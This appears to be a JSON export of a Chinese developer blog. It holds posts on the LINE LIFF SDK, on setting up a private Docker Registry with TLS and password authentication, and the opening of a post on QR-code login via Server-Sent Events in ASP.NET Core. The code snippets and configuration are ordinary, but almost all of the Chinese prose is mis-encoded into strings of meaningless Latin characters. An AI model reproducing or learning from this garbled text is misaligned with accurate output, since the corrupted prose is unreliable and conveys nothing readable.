å‡ç´šä¸€ä¸‹è³‡æ–™å°±æ¸…é™¤äº†ï¼Œå°ä½¿ç”¨è€…ä¾†èªªå…¶å¯¦å¾ˆä¸å¥½ç”¨ã€‚\nLINE LIFF Browser LINE LIFF Browserï¼š\né€™æ˜¯ä¸€å€‹ç›¸ç•¶ç‰¹æ®Šçš„ç€è¦½å™¨é¡å‹ï¼Œä»–åªæœ‰é€é LIFF App çš„å°ˆç”¨ç¶²å€æ‰èƒ½é–‹å•Ÿï¼Œç¶²å€çµæ§‹å¦‚ä¸‹ï¼š\n1 https://liff.line.me/{LIFF_ID} é€™å€‹ LIFF App å°ˆç”¨ç¶²å€å¿…é ˆè·Ÿ LINE Developers ä¹‹ä¸­çš„ LINE Login æˆ– LINE MINI App é »é“(Channel)ç¶å®šï¼Œäº‹å…ˆåœ¨ã€Œé »é“ã€ä¸­å»ºç«‹ä¸€çµ„ LIFF_ID æ‰èƒ½ä½¿ç”¨ã€‚åœ¨ LIFF SDK ä¸­ï¼Œæœ‰éƒ¨åˆ† API åªæœ‰åœ¨ LINE LIFF Browser ä¹‹ä¸­æ‰èƒ½ä½¿ç”¨ï¼\nä½¿ç”¨ LIFF App å°ˆç”¨ç¶²å€é–‹å•Ÿçš„ç¶²é ï¼Œä¸ä¸€å®šè¦ä½¿ç”¨ LIFF SDK ä¾†å¯¦ä½œï¼Œåªæ˜¯ç”¨äº† LIFF SDK å°±å¯ä»¥äº«å—è¨±å¤š LINE LIFF Browser æ‰æœ‰çš„åŠŸèƒ½ï¼Œå¯ä»¥é™ä½é–‹ç™¼é–€æª»ã€‚å…¶ä»–é–‹å•Ÿ LIFF App çš„èªªæ˜æ–‡ä»¶å¯ä»¥åƒè€ƒ Opening a LIFF app èªªæ˜ï¼\né€™å€‹ LIFF Browser ä¹Ÿæ”¯æ´ã€Œæœ€å°åŒ–ã€åŠŸèƒ½ï¼ŒæŠŠå‰›é–‹å•Ÿçš„ LIFF App æœ€å°åŒ–æˆä¸€å€‹ Iconï¼Œéš¨æ™‚å¯ä»¥é»æ“Š Icon æ¢å¾©ç€è¦½å™¨é¡¯ç¤ºï¼Œé‚„è »æ–¹ä¾¿çš„ã€‚è©³æƒ…è«‹è¦‹ Minimizing LIFF browser èªªæ˜ï¼ğŸ‘\nLINE MINI App LINE MINI Appï¼š\né€™ä¹Ÿæ˜¯ä¸€å€‹ç›¸ç•¶ç‰¹æ®Šçš„ç€è¦½å™¨é¡å‹ï¼Œå…¶ç”¨é€”è·Ÿ LINE LIFF Browser ç›¸ç•¶é¡ä¼¼ï¼Œéƒ½éœ€è¦å°ˆç”¨ç¶²å€æ‰èƒ½æ‰“é–‹ï¼Œä½†æ˜¯è·Ÿ LINE LIFF Browser ä¸åŒçš„åœ°æ–¹åœ¨æ–¼ï¼ŒLINE MINI App å¯ä»¥æ‰“åŒ…ä¸Šæ¶ç‚ºä¸€å€‹ LINE æœå‹™ï¼Œå¯ä»¥è®“ä½¿ç”¨è€…åœ¨ LINE App çš„ã€Œä¸»é ã€æœå°‹åˆ°é€™å€‹ LINE MINI Appï¼Œä½¿ç”¨ä¸Šæœƒæ–¹ä¾¿è¨±å¤šï¼Œé€šå¸¸åªæœ‰çŸ¥åå“ç‰Œæ‰æœƒé¸ç”¨é€™ç¨®æ–¹å¼ä¸Šæ¶ã€‚ç›®å‰ LINE MINI App åªæœ‰æŒ‡å®šçš„ LINE æŠ€è¡“åˆä½œå¤¥ä¼´æˆ–ç‰¹å®šä¸»é¡Œæˆ–å“ç‰Œæ‰èƒ½é€šéå¯©æ ¸ï¼Œåœ¨å°ç£å°šæœªå…¬é–‹çµ¦å¤§çœ¾ç”³è«‹ã€‚\nExternal Browser External Browserï¼š\nä½ å¯ä»¥åœ¨ LINE App ä¹‹ä¸­å·²ç¶“é–‹å•Ÿçš„ç€è¦½å™¨ï¼Œé¡å¤–å†é–‹å•Ÿä¸€å€‹ã€Œå¤–éƒ¨ç€è¦½å™¨ã€(External Browser)ï¼Œä½¿ç”¨æ‰‹æ©Ÿçš„é è¨­ç€è¦½å™¨ä¾†é–‹å•Ÿç¶²é ï¼Œé€™ç¨®ç¶²é åœ¨ç€è¦½çš„æ™‚å€™å°±å¯ä»¥ç”¨åˆ°å®Œæ•´çš„ç€è¦½å™¨èƒ½åŠ›ï¼Œé›–ç„¶å¯ä»¥è§£æ±º LINE App ä¹‹ä¸­çš„å…¶ä»–ç€è¦½å™¨é¡å‹æ‰€æåˆ°çš„ä¸€äº›é™åˆ¶ï¼Œä½†å»æœƒå¤±å»ä¸€äº›åœ¨ LINE è£¡é¢é–‹å•Ÿç¶²é çš„æ–¹ä¾¿æ€§ï¼Œä¾‹å¦‚ï¼šè‡ªå‹•ç™»å…¥ã€‚\né™¤æ­¤ä¹‹å¤–ï¼Œä½ ç›´æ¥ç”¨æ¡Œæ©Ÿçš„ä»»æ„ç€è¦½å™¨é–‹å•Ÿä¸€å€‹æœ‰ä½¿ç”¨ LIFF SDK çš„ç¶²é ï¼Œå° LIFF SDK ä¾†èªªï¼Œé€™å€‹ç€è¦½å™¨æœ¬èº«å°±æ˜¯ä¸€å€‹ã€Œå¤–éƒ¨ç€è¦½å™¨ã€(External Browser)ï¼Œä½ å¯ä»¥é€é LIFF SDK éå¸¸è¼•é¬†çš„å¯¦ç¾ LINE Login æ©Ÿåˆ¶ï¼Œåªè¦å‘¼å« liff.login() å³å¯ï¼ğŸ‘\né–‹å§‹ä½¿ç”¨ LIFF SDK é–‹ç™¼ç¶²é  åœ¨ä»»ä½•ä¸€å€‹ç¶²é ä¸Šï¼Œåªè¦åŠ å…¥ LIFF SDK æª”æ¡ˆï¼Œé€™æ˜¯ä¸€å€‹ JavaScript æª”ï¼Œå°±å¯ä»¥ç«‹å³é–‹å§‹ä½¿ç”¨ï¼Œä»¥ä¸‹æ˜¯åœ¨ä»»æ„ç¶²é åŠ å…¥ LIFF çš„æ¨™æº–ä½œæ¥­æµç¨‹ï¼š\nè¨­å®šç¶²é æ¨™é¡Œ (Page Title)\nè«‹åœ¨ HTML çš„ \u0026lt;head\u0026gt; å€æ®µä¸­åŠ å…¥ \u0026lt;title\u0026gt; æ¨™ç±¤ï¼Œç†è«–ä¸Šæ¯ä¸€ä»½ HTML æ‡‰è©²éƒ½æœ‰é€™å€‹æ¨™ç±¤å®šç¾©æ‰å°ï¼ 1 \u0026lt;title\u0026gt;The Will Will Web\u0026lt;/title\u0026gt; åŠ å…¥ LIFF SDK\nè«‹å°‡ LIFF SDK åŠ å…¥åˆ°ç¶²é  \u0026lt;body\u0026gt; æœ€é–‹é ­çš„åœ°æ–¹ï¼š 1 \u0026lt;script charset=\u0026#34;utf-8\u0026#34; src=\u0026#34;https://static.line-scdn.net/liff/edge/2/sdk.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; å¦‚æœä½ çš„ç¶²ç«™ä½¿ç”¨åˆ°ä»»ä½•å…¶ä»–å‰ç«¯æ¡†æ¶ï¼Œå¯èƒ½æœƒæƒ³æŠŠ LIFF SDK æ”¹ç”¨ npm çš„æ–¹å¼å®‰è£è¼‰å…¥ï¼š\n1 2 3 npm install --save @line/liff # or # yarn add @line/liff åŒ¯å…¥ liff ç‰©ä»¶çš„æ–¹æ³•ï¼š\n1 import liff from \u0026#39;@line/liff\u0026#39;; åˆå§‹åŒ– LIFF SDK\nåˆå§‹åŒ– LIFF SDK æ˜¯ä¸€å€‹éå¸¸å¿…è¦çš„æ“ä½œï¼Œå› ç‚ºç•¶ä½ çš„ç¶²é é–‹åœ¨ LINE In-App Browser æˆ– LINE LIFF Browser ç€è¦½å™¨æ™‚ï¼Œåœ¨ LIFF SDK åˆå§‹åŒ–éå¾Œæ‰èƒ½å‘¼å«æŸäº› API å–å¾—ç•¶å‰çš„ç’°å¢ƒè³‡è¨Šã€‚é€™è£¡æœ€é‡è¦çš„åƒæ•¸å°±æ˜¯ liffId äº†ï¼Œä½ è¦å…ˆåˆ° LINE Developers çš„ LINE Login æˆ– LINE MINI App é »é“çš„ LIFF é ç±¤å…§å…ˆå»ºç«‹ä¸€çµ„ LIFF_IDï¼Œä¸¦å°‡é€™å€‹ LIFF_ID è¨­å®šåˆ° liff.init() çš„ liffId åƒæ•¸ä¸Šã€‚ 1 2 3 4 5 6 7 \u0026lt;script\u0026gt; liff.init({ liffId: \u0026#39;1566379427-xKvNdlJ9\u0026#39; }).then(() =\u0026gt; { // Start to use liff\u0026#39;s api }); \u0026lt;/script\u0026gt; ä»¥ä¸‹æ˜¯å–å¾—ç’°å¢ƒè³‡è¨Šçš„ç¨‹å¼ç¢¼ç¯„ä¾‹ï¼Œè¨˜å¾—ä¸€å®šè¦åˆå§‹åŒ–ä¹‹å¾Œæ‰èƒ½åŸ·è¡Œé€™äº› API å–”ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;script\u0026gt; liff.init({ liffId: \u0026#39;1566379427-xKvNdlJ9\u0026#39; }).then(() =\u0026gt; { console.log(liff.getLanguage()); // å–å¾—ç”¨æˆ¶çš„ä¸»è¦èªè¨€ console.log(liff.getVersion()); // å–å¾— LIFF SDK çš„ç‰ˆæœ¬ console.log(liff.isInClient()); // åˆ¤æ–·ç›®å‰ç¶²é æ˜¯å¦è·‘åœ¨ LIFF Browser åº•ä¸‹ console.log(liff.isLoggedIn()); // åˆ¤æ–·é–‹å•Ÿæ­¤ç¶²é çš„ LINE ä½¿ç”¨è€…æ˜¯å¦ç‚ºç™»å…¥ç‹€æ…‹ console.log(liff.getOS()); // å–å¾—ä½¿ç”¨è€…ç›®å‰ä½¿ç”¨çš„ä½œæ¥­ç³»çµ±ç‚ºä½• console.log(liff.getLineVersion()); // å–å¾—ä½¿ç”¨è€…ç›®å‰ä½¿ç”¨çš„ LINE App ç‰ˆæœ¬ }); \u0026lt;/script\u0026gt; æ³¨æ„: ä½ åªè¦æ˜¯ç”¨ LINE LIFF Browser ç€è¦½å™¨é–‹å•Ÿ LIFF App ç¶²é ï¼Œé€é liff.init() åˆå§‹åŒ–ä¹‹å¾Œï¼Œé è¨­å°±æœƒè‡ªå‹•ç™»å…¥ï¼ğŸ‘\nå¦‚æœä½ å¸Œæœ›åœ¨åˆå§‹åŒ– LIFF SDK çš„æ™‚å€™ï¼Œå³ä¾¿åœ¨ã€Œå¤–éƒ¨ç€è¦½å™¨ã€çš„ç’°å¢ƒä¸‹ä¹Ÿè¦å•Ÿç”¨ã€Œè‡ªå‹•ç™»å…¥ã€åŠŸèƒ½ï¼Œå¯ä»¥åŠ å…¥ withLoginOnExternalBrowser: true åƒæ•¸ï¼Œä»–æœƒåœ¨é é¢åˆå§‹åŒ–çš„æ™‚å€™è‡ªå‹•é€²è¡Œ LINE Login çš„ OAuth 2.0 æˆæ¬Šæµç¨‹ï¼\n1 2 3 4 5 6 7 8 \u0026lt;script\u0026gt; liff.init({ liffId: \u0026#39;1566379427-xKvNdlJ9\u0026#39;, // Use own liffId withLoginOnExternalBrowser: true, // Enable automatic login process }).then(() =\u0026gt; { // Start to use liff\u0026#39;s api }); \u0026lt;/script\u0026gt; é€™å€‹ withLoginOnExternalBrowser: true é¸é …å»ºè­°åªç”¨åœ¨ LINE App å…§æ‰æœƒé–‹å•Ÿçš„ç¶²é ä¸Šä½¿ç”¨ã€‚å¦å‰‡ä½ èƒ½æƒ³åƒä½ é–‹å•Ÿæˆ‘çš„éƒ¨è½æ ¼å¾Œï¼Œç¬¬ä¸€æ™‚é–“è½‰å‘åˆ° LINE Login ç•«é¢æ˜¯ä»€éº¼æ„Ÿè¦ºå—ï¼ŸğŸ˜…\næœ‰äº›å–å¾—ç’°å¢ƒè³‡è¨Šçš„ API åœ¨é€é liff.init() åˆå§‹åŒ–ä¹‹å‰ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼š liff.readyï¼š æœƒå›å‚³ä¸€å€‹ Promise ä¸¦æœƒåœ¨ liff.init() åˆå§‹åŒ–å®Œç•¢å¾ŒåŸ·è¡Œï¼Œä½ å¯ä»¥åœ¨ .then() callback æ’°å¯«ä¸€äº›ç¨‹å¼ç¢¼ã€‚\nliff.getOS()ï¼š å–å¾—ç”¨æˆ¶ç«¯çš„ä½œæ¥­ç³»çµ±ï¼Œå¯èƒ½çš„å€¼åªæœ‰ iosã€android èˆ‡ webã€‚\nliff.getLanguage()ï¼š é€™ç­‰åŒæ–¼é€é navigator.language å–å¾—ç›®å‰ç€è¦½å™¨ä½¿ç”¨çš„èªè¨€ã€‚\nliff.getVersion()ï¼š å–å¾—ç›®å‰ LIFF SDK ä½¿ç”¨çš„ç‰ˆæœ¬ã€‚\nliff.getLineVersion()ï¼š å–å¾—ä½¿ç”¨è€…ç›®å‰ LINE App çš„ç‰ˆæœ¬ã€‚\nliff.isInClient()ï¼š åˆ¤æ–·ç›®å‰ç¶²é æ˜¯å¦è·‘åœ¨ LIFF Browser åº•ä¸‹ï¼Œä½ å¯ä»¥è—‰æ­¤åˆ¤æ–·æ˜¯å¦è¦åˆå§‹åŒ– LIFF SDK æˆ–é€é liff.closeWindow() é—œé–‰è¦–çª—ï¼\nliff.closeWindow()ï¼š ä½ å¯ä»¥ä»»æ„æ™‚é–“é€éé€™å€‹ API é—œé–‰è¦–çª—ï¼Œç”šè‡³æ–¼åœ¨ liff.init() åˆå§‹åŒ–å®Œæˆä¹‹å‰ä¹Ÿå¯ä»¥é—œé–‰ã€‚\nliff.use()ï¼š å•Ÿç”¨èˆ‡åˆå§‹åŒ–ä¸€å€‹ LIFF Pluginã€‚\nliff.i18n.setLang()ï¼š è¨­å®š LIFF SDK çš„é¡¯ç¤ºèªè¨€ï¼Œä»»ä½• RFC 5646 (BCP 47) å®šç¾©çš„èªè¨€éƒ½å¯ä»¥ï¼Œç¹é«”ä¸­æ–‡å¯ä»¥æ˜¯ zh-Hant æˆ– zh-Hant-TW éƒ½å¯ä»¥ã€‚\nä»¥ä¸Šå°±æ˜¯ä½¿ç”¨ LIFF SDK é–‹ç™¼ç¶²é çš„èµ·æ‰‹å¼ï¼Œç†è§£äº†è§€å¿µèˆ‡å•Ÿå‹•æ–¹æ³•ï¼Œå…¶ä»–éƒ½ä¸è¤‡é›œäº†ï¼Œå‰©ä¸‹çš„ API å°±æ˜¯æœ‰ç”¨åˆ°çš„æ™‚å€™æ‰å»çœ‹ LIFF v2 API reference èªªæ˜æ–‡ä»¶ã€‚ç•¶ç„¶ï¼Œåˆ¥å¿˜è¨˜ LIFF Playground çš„å­˜åœ¨ï¼Œä»–å¯ä»¥å¾ˆå¿«é€Ÿçš„å¹«åŠ©ä½ å¿«é€Ÿç€è¦½æ‰€æœ‰çš„ LIFF APIsï¼ğŸ‘\nç¸½çµ æˆ‘è¦ºå¾— LIFF ä¸¦ä¸é›£ï¼Œé›£çš„åœ°æ–¹åœ¨æ–¼åˆå­¸è€…å¾ˆå®¹æ˜“æä¸æ¸…æ¥š LIFF çš„ç”¨é€”ã€LIFF Browser çš„å­˜åœ¨ èˆ‡ LIFF App çš„é–‹å•Ÿæ–¹å¼ï¼Œææ‡‚é€™äº›åœ°æ–¹ï¼Œå¾ŒçºŒåœ¨é–‹ç™¼ä¸Šå°±ä¸æœƒæœ‰ç”šéº¼å›°é›£èˆ‡éšœç¤™äº†ï¼ğŸš€\n","date":"2023-02-01T00:00:00Z","image":"https://live.staticflickr.com/65535/52662373535_00afc03eca_o.jpg","permalink":"https://wayneblog.ga/2023-02-01/line-front-end-framework-v2/","title":"ã€LIFFã€‘èªè­˜ LINE Front-end Framework (LIFF) å‰ç«¯æ¡†æ¶ (LIFF v2)"},{"content":" åƒè€ƒç¶²ç«™\nå‰è¨€ æ·±åº¦æ‡‰ç”¨ Docker å®¹å™¨å¾Œå¸¸æœƒèµ°åˆ°é€™ä¸€æ­¥ - è‡ªå»º Docker Registry (å®¹å™¨ Image å€‰åº«)ã€‚\nä¸ç®¡ç”¨ docker æŒ‡ä»¤æˆ–è·‘ Docker Composeï¼Œå»ºç«‹å®¹å™¨éƒ½éœ€å…ˆè¼‰å…¥ Docker Imageï¼Œè‹¥æ˜¯å…¬é–‹ Imageï¼Œé€é docker pull æŒ‡ä»¤ã€åœ¨ docker-compose.yml æŒ‡å®š image ä¾†æºã€æˆ– Dockerfile å¯« FROM imageName:tagï¼Œéƒ½å¯å¾ Docker Hub ä¸‹è¼‰ï¼Œç§æœ‰ç¨‹å¼æˆ–å…§éƒ¨æ‡‰ç”¨ç³»çµ±ä¸é©åˆä¸Šå‚³ç¬¬ä¸‰æ–¹ç³»çµ±ï¼Œä¼æ¥­å…§éƒ¨ä¸»æ©Ÿå‰‡å¯èƒ½ä½æ–¼ç„¡æ³•é€£ Internet çš„ç’°å¢ƒï¼Œå¾ Docker Hub ä¸‹è¼‰é€™æ¢è·¯ä¾¿ä¸å¯è¡Œã€‚ç°¡å–®åšæ³•æ˜¯ç”¨ docker save container-name \u0026gt; container-name.tar å† scp ä¸Šå‚³åˆ° Docker ä¸»æ©Ÿç”¨ docker load -i container-name.tar è¼‰å…¥ï¼Œä½†å„²å­˜ã€ä¸Šå‚³ã€è¼‰å…¥(æœ‰æ™‚é‚„éœ€è¦å£“ç¸®è§£å£“ç¸®)ç¨‹åºè¤‡é›œï¼Œè‹¥è¦éƒ¨ç½²å¤šå°ä¸»æ©Ÿæ ¼å¤–æ²’æ•ˆç‡ã€‚å› æ­¤ï¼Œå»ºç«‹ç§æœ‰ Docker Registry å–ä»£ Docker Hub çš„è§’è‰²ï¼Œæ˜¯è¼ƒçœäº‹æœ‰æ•ˆç‡çš„å¯¦å‹™åšæ³•ã€‚\n(è£œå……ï¼šé—œæ–¼ Container Image éƒ¨ç½²ï¼Œå¯åƒè€ƒä¿å“¥é€™ç¯‡é·ç§»å®¹å™¨æ˜ åƒ(Container Image)åˆ°å¦ä¸€å°ä¸»æ©Ÿçš„å„ç¨®ä½œæ³•)\nDocker æ”¯æ´è‡ªå»ºç§æœ‰ Registry ä¼ºæœå™¨ï¼Œä¸æ„å¤–åœ°æœ‰å®‰è£æˆ Docker å®¹å™¨çš„ä¾¿æ·åšæ³•ã€‚ç¶“ç°¡å–®è¨­å®šèˆ‡å®‰è£ï¼Œæ¶ä¸€å°ç§æœ‰ Docker Registry å„²å­˜éå…¬é–‹å®¹å™¨ Image ä¸¦ä¸å›°é›£ã€‚èªªæ˜¯ä¸€å›äº‹ï¼Œåšæ˜¯ä¸€å›äº‹ï¼Œé€™ç¯‡ä¾†å¯¦åœ°æ¼”ç·´ä¸€æ¬¡ã€‚\né–‹å§‹ é¦–å…ˆæº–å‚™ä¸€å° Docker ä¸»æ©Ÿï¼Œè£å¥½ Nginx + Certbot æœå‹™ï¼Œæˆ‘æ˜¯åœ¨ Azure é–‹ä¸€å€‹ B1s å° VM ä¾†è·‘ã€‚\nè¨»ï¼šAzure æœ‰ Azure Container Registry çš„ç¾æˆé›²ç«¯æœå‹™ï¼Œåšæ³•æ›´ç°¡ä¾¿ã€‚å­¸ç¿’åœ¨ Linux è·‘ Docker åšæ³•æ˜¯ç‚ºå°‡ä¾†åœ¨é›¢ç·šç’°å¢ƒå»ºç«‹ Docker Registry åšæº–å‚™ã€‚\nä»¥æˆ‘çš„æ¨™æº–ï¼Œå³ä¾¿å…§éƒ¨ä¼ºæœå™¨ä¹Ÿè¦æ§ç®¡å­˜å–èº«åˆ†ï¼Œä¸èƒ½è®“é–’é›œäººç­‰éš¨ä¾¿ç”¨ã€‚Docker Registry æ”¯æ´å¸³è™Ÿå¯†ç¢¼ç™»å…¥ï¼Œä½†å‰é¡Œè¦å•Ÿç”ª TLS HTTPS é€£ç·šï¼Œæ•…é™¤äº†å®‰è£ htpasswd å·¥å…·è¨­å®šå¯†ç¢¼é›œæ¹Šæª”ï¼Œä¸¦éœ€è¦å®‰è£ mkcert å»ºç«‹ TLS æ†‘è­‰ï¼š\n1 sudo apt-get install apache2-utils mkcert æˆ‘åœ¨ä¸»æ©Ÿç«¯å»ºäº†ä¸€å€‹ /var/registry è³‡æ–™å¤¾æ”¾ Docker Registry ç›¸é—œæª”æ¡ˆï¼Œæ¥è‘—ç”¨ mkcert å»ºç«‹è‡ªç°½æ†‘è­‰çµ¦ Registry ç”¨ï¼š\nè¨­å®šå¸³è™Ÿå¯†ç¢¼ï¼š\næº–å‚™å¥½ Docker Compose è¨­å®šæª”ï¼ŒREGISTRY_HTTP_TLS_CERTIFICATE åŠ REGISTRY_HTTP_TLS_KEY ç’°å¢ƒè®Šæ•¸æŒ‡å‘ mkcert å‰›æ‰è£½ä½œçš„å…©å€‹ pem æª”åã€REGISTRY_AUTH_HTPASSWD_PATH æŒ‡å‘å¯†ç¢¼æª”åï¼›volumes éƒ¨åˆ†å°‡ Docker çš„ Image è³‡æ–™ã€æ†‘è­‰ã€èªè­‰è³‡æ–™å°æ‡‰åˆ° /var/registry å¯¦é«”è·¯å¾‘ä¿å­˜ï¼Œä»¥å…å®¹å™¨é—œé–‰å¾Œè³‡æ–™æ¶ˆå¤±ï¼š\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 version: \u0026#34;3\u0026#34; services: registry: restart: always image: registry:2 ports: - 5000:5000 environment: REGISTRY_HTTP_TLS_CERTIFICATE: /certs/localhost.pem REGISTRY_HTTP_TLS_KEY: /certs/localhost-key.pem REGISTRY_AUTH: htpasswd REGISTRY_AUTH_HTPASSWD_PATH: /auth/htpasswd REGISTRY_AUTH_HTPASSWD_REALM: Registry Realm volumes: - /var/registry/data:/var/lib/registry - /var/registry/certs:/certs - /var/registry/auth:/auth ç”¨ docker-compose up -d å•Ÿå‹•å®¹å™¨ï¼Œè‹¥ä¸€åˆ‡æ­£å¸¸ï¼Œç”¨ curl https://localhost:5000/v2/ æ¸¬è©¦ï¼Œè‹¥å‚³å› {\u0026quot;errors\u0026quot;:[{\u0026quot;code\u0026quot;:\u0026quot;UNAUTHORIZED\u0026quot;,\u0026quot;message\u0026quot;:\u0026quot;authentication required\u0026quot;,\u0026quot;detail\u0026quot;:null}]} å°±ä»£è¡¨æˆåŠŸäº†ã€‚\næ¥è‘—ä¾†æ¸¬è©¦ Push Image åˆ°ç§æœ‰ Registryï¼Œæ“ä½œç¨‹åºæ˜¯ç”¨ docker tag ç‚ºå·±è¼‰å…¥å®¹å™¨åŠ ä¸Š localhost:5000/aspnetapp é€™ç¨®æ¨™ç±¤ï¼Œæ­¤æ™‚ç­‰åŒåŒä¸€å€‹ IMAGE ID æœ‰å…©å€‹ Tagï¼Œç”±æ–¼ Registry éœ€è¦ç™»å…¥ï¼Œç”¨å‰›æ‰çš„è¨­å®šå¸³è™Ÿå¯†ç¢¼ä»¥æŒ‡ä»¤ docker login ç™»å…¥ï¼Œæ¥è‘— docker push localhost:5000/aspnetsapp å°±èƒ½å®Œæˆä¸Šå‚³ï¼š\næª¢æŸ¥è³‡æ–™å¤¾ /var/registry/data/docker/registry/v2/repositories/aspnetapp/_layers/sha256 å¯çœ‹è¦‹ä¸Šå‚³éç¨‹å‡ºç¾çš„å››å€‹ Layer IDï¼ŒæˆåŠŸï¼\næ¥ä¸‹ä¾†è©¦è©¦å¾ Windows Docker Desktop å¾ VM çš„å°å¤–ç¶²åŸŸåç¨±ä¸‹è¼‰å®¹å™¨ Image åŸ·è¡Œï¼Œä¸€æ¨£è¼•é¬†ç§’æ®ºï¼š\nä»¥ä¸Šï¼Œä¸€å°è‡ªå»º Docker Registry ä¾¿ä¸Šç·šæœå½¹å›‰ï½\n","date":"2023-01-31T00:00:05Z","image":"https://live.staticflickr.com/65535/52660201816_629b9ddf09_o.png","permalink":"https://wayneblog.ga/2023-01-31/docker-private-registry/","title":"ã€Dockerã€‘å»ºç«‹ç§æœ‰ Docker Registry"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå¤šå› ç´ èªè­‰(Multiple Factor Authenticationï¼ŒMFA)æ˜¯ç¶²é å¸¸æœƒç”¨åˆ°ä¸€ç¨®æŠ€å·§ï¼Œä»‹é¢åœåœ¨ç™»å…¥ç¶²é ï¼Œç­‰å¾…æ‰‹æ©Ÿ App æ“ä½œï¼Œç¶²é èƒ½åµæ¸¬ App å‹•ä½œæ˜¯å¦å®Œæˆï¼Œè‹¥é©—è­‰æˆåŠŸè‡ªå‹•å°å‘å·²ç™»å…¥ç•«é¢ï¼Œæœ¬ç¯‡ä¾†ç°¡æ˜“çš„å¯¦ä½œæ­¤æµç¨‹ã€‚\nä»¥ Facebook ç‚ºä¾‹ ä»¥ Facebook ç‚ºä¾‹ï¼Œè‹¥æœ‰å•Ÿå‹•å…©éšæ®µé©—è­‰ï¼Œç¬¬ä¸€æ¬¡ç™»å…¥ç¶²ç«™ï¼Œè¼¸å…¥å¯†ç¢¼å¾Œæœƒå‡ºç¾ä»¥ä¸‹ç•«é¢ï¼š\né™¤äº†é–‹ä»£ç¢¼ç”¢ç”Ÿå™¨(Authenticator App)æŸ¥é©—è­‰ç¢¼åœ¨ç¶²é è¼¸å…¥ï¼Œæœ‰å®‰è£ Facebook App ä¸”ç‚ºç™»å…¥ç‹€æ…‹çš„æ‰‹æ©Ÿä¹Ÿæœƒå‡ºç¾ã€Œå‰›å‰›æ˜¯ä½ æœ¬äººç™»å…¥çš„å—ï¼Ÿã€ç™»å…¥ï¼Œåªè¦æŒ‰ã€Œæ˜¯ã€å³å¯è·³éè¼¸å…¥é©—è­‰ç¢¼æ­¥é©Ÿï¼Œè‡ªå‹•é€²å…¥ç™»å…¥å¾Œç•«é¢ï¼š\nå¯¦ä½œ ã€Œéœ€è¦é›™é‡é©—è­‰ç¢¼ã€ç¶²é å¿…å®šå¯æŒçºŒå¾ç¶²ç«™æ¥æ”¶æœ€æ–°ç‹€æ…‹ï¼Œæ‰èƒ½åšåˆ°æ‰‹æ©Ÿ App ä¸€æŒ‰ã€Œæ˜¯ã€é¦¬ä¸Šæ¥åˆ°é€šçŸ¥ã€‚å°å‰ç«¯ç¶²é ä¾†èªªï¼Œé€™ä¸æ˜¯ä»€éº¼æ–°é®®æŠ€è¡“ï¼Œåšæ³•å¾ˆå¤šï¼Œå¾é›–å¯æ¥ä½†æœ‰ç”¨çš„ setInterval å®šæœŸæŸ¥è©¢ã€Long Pollingã€Server-Sent Eventã€WebSocketï¼Œä¹ƒè‡³æ›´é«˜éšçš„ç¨‹å¼åº«å¦‚ SignalRï¼Œéƒ½æ˜¯è§£æ³•ã€‚é€™é‚Šæˆ‘ä½¿ç”¨ Servent-Sent Event (SSE)ï¼Œç†ç”±æ˜¯æ¯”è¼ªè©¢å³æ™‚æœ‰æ•ˆç‡ï¼Œä¸åƒ WebSocket æœƒå› é˜²ç«ç‰†ã€Proxy æˆ–ç¶²ç«™ä¼ºæœå™¨ä¸æ”¯æ´è€Œå¤±æ•ˆï¼Œåˆæ¯” SignalR ä¾†å¾—è¼•å·§ã€‚\næœ¬å°ˆæ¡ˆå·²æ”¹ç”¨ ASP.NET Coreï¼Œåšæ³•ä¸åŒã€‚æŸ¥äº†ä¸€ä¸‹ï¼Œç™¼ç¾ NuGet å¥—ä»¶ Lib.AspNetCore.ServerSentEventsï¼Œæ–‡ä»¶æ¸…æ¥šä¸”æ“´å……å½ˆæ€§ä¸éŒ¯ï¼Œæ²’å¿…è¦è‡ªå·±é€ è¼ªå­ã€‚\nå…ˆçœ‹è©¦åšæˆæœï¼š\næˆ‘å»ºäº†ä¸€å€‹ ASP.NET Core MVC ç«™å°ï¼Œé¦–é æ”¾äº†ä¸€é¡†éˆ•ï¼ŒæŒ‰ä¸‹æœƒå½ˆå‡º QR Code ç¶²é ï¼Œ10 ç§’å…§æƒç„ QR Code å‘¼å«æŒ‡å®šç¶²å€ï¼Œé¦–é æœƒå¾ SSE æ¥ç²é€šçŸ¥ç¢ºèªæƒç„å®Œæˆã€‚ç‚ºæ–¹ä¾¿æœ¬æ©Ÿæ¸¬è©¦ï¼Œæˆ‘åŠ äº†ä¸€é¡†éˆ•ç”¨ JavaScript ç¨‹å¼ç€è¦½æŒ‡å®š URL æ¨¡æ“¬æƒç„ QR Code å‹•ä½œã€‚è€Œç­‰å¾…æƒç„éç¨‹æœƒè¨ˆæ™‚ï¼Œæœªåœ¨æ™‚é™å…§å®Œæˆå°‡åˆ¤å®šé€¾æ™‚ã€‚\nIndex.cshtml å¯«æ³•å¦‚ä¸‹ï¼ŒåŸç†æ˜¯é–‹å•Ÿ EventSource() æ¥æ”¶ä¼ºæœå™¨ç«¯ SSE å›æ‡‰ï¼Œæ–°é–‹å•Ÿçš„ QR Code è¦–çª—å¼•å°ä½¿ç”¨è€…å‘¼å«ç‰¹å®šé€£çµè§¸ç™¼å¾ SSE é€£ç·šå›å‚³çµæœï¼Œæ­£å¸¸ç”± onmessage äº‹ä»¶æ¥æ”¶ã€é€¾æ™‚æˆ–å‡ºéŒ¯å‰‡ç”± onerror äº‹ä»¶æ¥æ”¶ï¼š\nViews/Home/Index.cshtml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 @{ ViewData[\u0026#34;Title\u0026#34;] = \u0026#34;Home Page\u0026#34;; } \u0026lt;div class=\u0026#34;text-center\u0026#34;\u0026gt; \u0026lt;h1 id=\u0026#34;h\u0026#34; class=\u0026#34;display-4\u0026#34;\u0026gt;Welcome\u0026lt;/h1\u0026gt; \u0026lt;button id=\u0026#34;btn\u0026#34; onclick=\u0026#34;showQRCode()\u0026#34;\u0026gt;Scan QR Code\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var qrCodeWin; var source = new 